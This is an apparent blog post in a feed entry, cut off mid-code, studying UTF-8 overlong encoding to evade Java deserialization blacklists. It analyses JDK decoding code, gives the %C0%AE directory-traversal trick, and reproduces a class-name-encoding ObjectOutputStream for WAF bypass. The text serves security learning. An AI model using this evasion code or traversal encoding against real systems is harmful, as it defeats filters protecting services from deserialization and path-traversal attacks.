    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UTF-8 Overlong Encoding绕过学习</title>
    <link href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-20T12:39:41.000Z</published>
    <updated>2024-11-11T12:12:42.163Z</updated>
    
    <content type="html"><![CDATA[<p>之前只是浅浅的知道这个东西，现在来深入学习一下，因为在java题目中有时会用到该方法来进行绕过</p><h1 id="utf-8编码过程"><a href="#UTF-8编码过程" class="headerlink" title="UTF-8编码过程"></a>UTF-8编码过程</h1><p>UTF-8（8-bit Unicode Transformation Format）是一种用于编码Unicode字符的可变长度字符编码方案。它能够表示Unicode字符集中的每个字符，并且与ASCII编码兼容。</p><p>它可以将Unicode里的所有字符转换成1到4个字节来表示</p><p>下面是一个Unicode对应UTF-8的转换表</p><p><img src="https://cdn.clown2024.cn/202410202132477.png" alt="image-20241020213226571"></p><ul><li>常见的ASCII字符（U+0000到U+007F）用1个字节表示。</li><li>其他Unicode字符根据其范围使用2到4个字节。</li></ul><p>以欧元符号€来举例，该符号的Unicode编码为U+20AC，位于U+0800和U+FFFF之间，所以为三个字节，编码长度为3，0x20AC的二进制为<strong>10 0000 1010 1100</strong></p><p>然后根据每个字节缺的位数，从左至右按顺序分成三组，第一组长度不满在前面补零：0010，000010，101100</p><p>然后填进去，转换成十六进制，欧元符号的UTF-8编码就是<strong>\xE2\x82\xAC</strong></p><p>python来decode验证一下</p><p><img src="https://cdn.clown2024.cn/202410202147505.png" alt="image-20241020214652039"></p><h1 id="overlong-encoding绕过原理"><a href="#Overlong-Encoding绕过原理" class="headerlink" title="Overlong Encoding绕过原理"></a>Overlong Encoding绕过原理</h1><p>Overlong Encoding就是将一个字节的字符按照UTF-8的编码形式强行编码成两个字符</p><p>比如”.”这个字符正常Unicode编码为0x2E，按照utf-8的形式只能被编码为一个字节，但是我们可以按照两个字节的编码形式，通过补0强行分成两组</p><p>0x2E的二进制是10 1110，现在直接前面补5个0，变成00000 101110这样的两组，然后他的UTF-8的编码形式就变成<strong>\xC0\xAE</strong></p><p>但是这个编码并不是一个合法的UTF-8编码，有些语言在转换的时候会进行检查比如python；而有些则对该检查存在缺陷，导致能够正常解析出来，比如java，这就造成<strong>Overlong Encoding绕过</strong></p><p>python进行解码的话会报下面的错误</p><p><img src="https://cdn.clown2024.cn/202410202204297.png" alt="image-20241020220411264"></p><p>会直接说非法字节，无法转换编码</p><p>该绕过方式会在一些目录穿越的时候用到，比如用%C0%AE来代替.，来绕过对目录穿越的限制，原因就是该服务在路径解码时使用UTF-8编码</p><h1 id="overlong-encoding在java中的绕过利用"><a href="#Overlong-Encoding在java中的绕过利用" class="headerlink" title="Overlong Encoding在java中的绕过利用"></a>Overlong Encoding在java中的绕过利用</h1><p>在java的waf中通常是检查序列化的字节流中是否有敏感类来进行过滤，比如重写resolveClass来添加黑名单，如果能够进行二次反序列化可能有机会绕过一些关键类，但如果禁用得太死就轮到Overlong Encoding方法来大显身手了。</p><blockquote><p>回来补充了：</p><p>这里有个地方得纠正一下，如果重写了resolveClass的话，我们是无法用utf-8来绕过的，因为resolveClass已经是在类的链接阶段了，此时utf-8的解析已经过了，所以在resolveClass的时候还是能够看到完整的类名</p><p>UTF-8只适用于直接对字节流过滤的情况</p></blockquote><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们知道在序列化的时候，类名是直接明文可读，waf检测也是基于此形式，那绕过的思路就是利用Overlong Encoding来编码这些类名，让其不可见从而绕过检测</p><p>那现在就去看看java反序列化时是怎么读取类名，分析为什么我们可以绕过</p><p>这里尝试自己调了一下，发现不太好调(主要是太菜了🥲)，1ue师傅的文章给出了调用栈，就不重头自己调了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectStreamClass#readNonProxy(ObjectInputStream in)<br>ObjectInputStream#readUTF()<br>BlockDataInputStream#readUTF()<br>ObjectInputStream#readUTFBody(long utflen)<br>ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)<br></code></pre></td></tr></table></figure><p>直接断在readNonProxy方法的调用处</p><p><img src="https://cdn.clown2024.cn/202410202345526.png" alt="image-20241020234544465"></p><p>看一下idea的调用栈，大概知道一下怎么来到这里的</p><p><img src="https://cdn.clown2024.cn/202410202346567.png" alt="image-20241020234623530"></p><p>然后跟进readNonProxy方法</p><p><img src="https://cdn.clown2024.cn/202410202347133.png" alt="image-20241020234726090"></p><p>可以看到类名的读取就是用readUTF方法</p><p>然后直接走到比较关键的ObjectInputStream#readUTFBody方法里面</p><p><img src="https://cdn.clown2024.cn/202410202354104.png" alt="image-20241020235420062"></p><p>最后的读取实现逻辑就在这两个方法里面，这两个方法里面读取字节的关键逻辑是一样的，看其中一个即可</p><p>这里看一下readUTFSpan方法的逻辑，该方法就是根据utflen去获取classname的值并返回到sbuf中</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">readUTFSpan</span><span class="hljs-params">(StringBuilder sbuf, <span class="hljs-type">long</span> utflen)</span><br>            <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cpos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> pos;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">avail</span> <span class="hljs-operator">=</span> Math.min(end - pos, CHAR_BUF_SIZE);<br>            <span class="hljs-comment">// stop short of last char unless all of utf bytes in buffer</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">stop</span> <span class="hljs-operator">=</span> pos + ((utflen &gt; avail) ? avail - <span class="hljs-number">2</span> : (<span class="hljs-type">int</span>) utflen);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">outOfBounds</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; stop) &#123;<br>                    <span class="hljs-type">int</span> b1, b2, b3;<br>                    b1 = buf[pos++] &amp; <span class="hljs-number">0xFF</span>;<br>                    <span class="hljs-keyword">switch</span> (b1 &gt;&gt; <span class="hljs-number">4</span>) &#123;<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:   <span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:  <span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>                            b2 = buf[pos++];<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:  <span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>                            b3 = buf[pos + <span class="hljs-number">1</span>];<br>                            b2 = buf[pos + <span class="hljs-number">0</span>];<br>                            pos += <span class="hljs-number">2</span>;<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 10xx xxxx, 1111 xxxx</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException ex) &#123;<br>                outOfBounds = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (outOfBounds || (pos - start) &gt; utflen) &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * Fix for 4450867: if a malformed utf char causes the</span><br><span class="hljs-comment">                     * conversion loop to scan past the expected end of the utf</span><br><span class="hljs-comment">                     * string, only consume the expected number of utf bytes.</span><br><span class="hljs-comment">                     */</span><br>                    pos = start + (<span class="hljs-type">int</span>) utflen;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                &#125;<br>            &#125;<br><br>            sbuf.append(cbuf, <span class="hljs-number">0</span>, cpos);<br>            <span class="hljs-keyword">return</span> pos - start;<br>        &#125;<br></code></pre></td></tr></table></figure><p>里面分别对1字节、2字节、3字节的形式进行了处理，对字节格式的判断是通过b1的高四位来确定的</p><p><strong>1字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br></code></pre></td></tr></table></figure><p>这里的处理很简单，直接将b1字节值转换成字符</p><p><strong>2字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>b2 = buf[pos++];<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>        ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>检查第二个字节是否符合格式，然后合并两个字节生成字符</p><p>首先根据b1高四位为12或者13，知道b1的前四位只能为1100或1101，也就是前三位固定为110；b2与上0xc0一定要为0x80，所以b2前两位一定为10；</p><p>然后在转换字符的时候，由b1字节的最后两位和b2的后六位构成字符的字节，也就是unicode的代码点，最后读取出我们的字符</p><p>b1&amp;0x1F的作用就是去除前缀110，同样的b2&amp;0x3F的作用就是去除前缀10</p><blockquote><p>这里有个比较重要的地方，就是int类型的移位</p><p>因为一开始习惯性的认为超出8位会被截断，后来一想如果只有8位怎么表示unicode字符这么大的代码点呢</p><p>后来就知道了int类型因为是32位，他是按照32位来移位的，所以上面的移位操作并不会发生截断，也就是比如：00010100左移五位是10100 00000，这是按照32位来的，这样上面的合并操作看起来就合理了</p></blockquote><p>如果想要用两个字节表示一个字符比如o的话，<strong>o的二进制为01101111</strong>，我们可以根据要求将其扩充成两字节UTF-8的编码</p><p>根据上面可知，b1保留了自己的中间3位，形式为 110+三位+要合并的两位，b2就是b1的后两位加上自己的后6位，所以这六位很容易知道是固定的，b2的前缀一定为10，所以b2就是固定的没办法变化</p><p>然后我们想转字符的话，由于字母的Unicode编码是0-127，所以第一位字节肯定为0，如果我们要得到这种形式，那么b1的中间3位一定得为0也是固定的，合并的两位就是我们o字符的前两位</p><p>所以o转换成能够解析的二进制形式就为：11000001 10101111，固定为\xC1\xAF</p><p><strong>3字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>b3 = buf[pos + <span class="hljs-number">1</span>];<br>b2 = buf[pos + <span class="hljs-number">0</span>];<br>pos += <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>         ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>         ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>同样检查后两个字节然后合并生成字符，有前面分析2字节处理的基础，分析3字节的处理也就简单很多了</p><p>首先b1右移4位等于14，即前缀一定是1110，然后就是判断b2、b3前缀是否为10</p><p>合并的逻辑就是：b1去除前缀左移12位，b2去除前缀左移6位，b3去除前缀不移位</p><p>然后就是想要三字节合并为一个ascii字符有什么要求了</p><ul><li>b1：为前缀1110 + 0000，固定了</li><li>b3：没有移位也是固定的，就是10+我们要转化的字符的后六位</li><li>b2：100000 + 字符前两位</li></ul><p>例如用b1，b2，b3表示j字符：11100000 10000001 10101010</p><h2 id="转换为overlong-encoding"><a href="#转换为Overlong-Encoding" class="headerlink" title="转换为Overlong Encoding"></a>转换为Overlong Encoding</h2><p>那么应该对类进行转换呢，我们可以想到直接暴力将所有序列化字节流进行替换，但会破坏一些非类名的信息，可能导致反序列化失败，<a href="https://xz.aliyun.com/u/81008"><strong>lzstar</strong></a>师傅的文章中给出了方法，我们可以继承ObjectOutputStream重写里面的序列化逻辑，更准确的说，是重写序列化类名的方法</p><p>师傅的重写思路就是继承ObjectOutputStream，重写writeClassDescriptor方法，在writeClassDescriptor方法中实现desc.writeNonProxy(this)方法的逻辑和将类名Overlong Encoding的逻辑，具体操作的话就是直接将desc.writeNonProxy(this)方法的逻辑复制进去，缺少的属性可以通过反射获取，缺少的方法可以通过反射调用，之后在里面加上Overlong Encoding的逻辑就可以了。</p><p>直接贴师傅的代码了这里，膜拜佬orz</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参考p神：https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span><br><span class="hljs-comment"> * 参考1ue：https://t.zsxq.com/17LkqCzk8</span><br><span class="hljs-comment"> * 实现：参考 OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span 